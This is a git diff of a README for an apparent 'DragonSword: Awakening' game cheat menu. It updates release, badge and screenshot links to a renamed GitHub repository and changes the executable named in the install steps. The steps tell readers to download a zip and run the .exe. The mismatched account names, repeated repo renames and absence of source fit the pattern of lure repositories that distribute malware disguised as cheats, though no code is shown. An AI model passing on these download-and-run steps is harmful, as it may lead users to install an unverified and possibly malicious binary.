@@ -1,10 +1,10 @@
 # DragonSword : Awakening Hack (Cheats Menu) (23-Aug-26)
 
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Cheat/releases/download/v1.2/DSAW-V1.zip)
-[![GitHub release](https://img.shields.io/badge/Release-v1-blue?style=for-the-badge)](https://github.com/RaikageDisplay/DragonSword-Awakening-Cheat/releases/download/v1.2/DSAW-V1.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack-V1/releases/download/v1.3/DSAW-V1.zip)
+[![GitHub release](https://img.shields.io/badge/Release-v1-blue?style=for-the-badge)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack-V1/releases/download/v1.3/DSAW-V1.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Stars](https://img.shields.io/github/stars/Crushflalead/DragonSword-Awakening-Trainer?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Cheat/stargazers)
+[![Stars](https://img.shields.io/github/stars/Crushflalead/DragonSword-Awakening-Trainer?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack-V1/stargazers)
 
 
 
@@ -66,16 +66,16 @@ Check the Features list below.
 ---
 
 ## How to Install
-1. Download the [latest release build](https://github.com/RaikageDisplay/DragonSword-Awakening-Cheat/releases/download/v1.2/DSAW-V1.zip) from repo's Releases page.
+1. Download the [latest release build](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack-V1/releases/download/v1.3/DSAW-V1.zip) from repo's Releases page.
 2. Extract the contents to any folder (e.g., `C:\DragonSwordtoolssss`).
 3. Launch game.
-4. Run `DS-Awakening-Hack_github-1.2.exe`.
+4. Run `DS-Awakening_1.3.exe`.
 5. Enjoy. Press the toggle hotkey (default: `[Insert]`) to open the menu.
 
 ---
 
 ## Screenshots
-![Mod Menu Preview](https://github.com/RaikageDisplay/DragonSword-Awakening-Cheat/blob/main/assets/image.png)
+![Mod Menu Preview](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack-V1/blob/main/assets/image.png)
 
 
 ---
@@ -101,4 +101,4 @@ Simply delete the extracted folder. No registry changes or leftover files.
 
 
 
-[![Made with C++](https://img.shields.io/badge/Made%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack)
+[![Made with C++](https://img.shields.io/badge/Made%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack-V1)
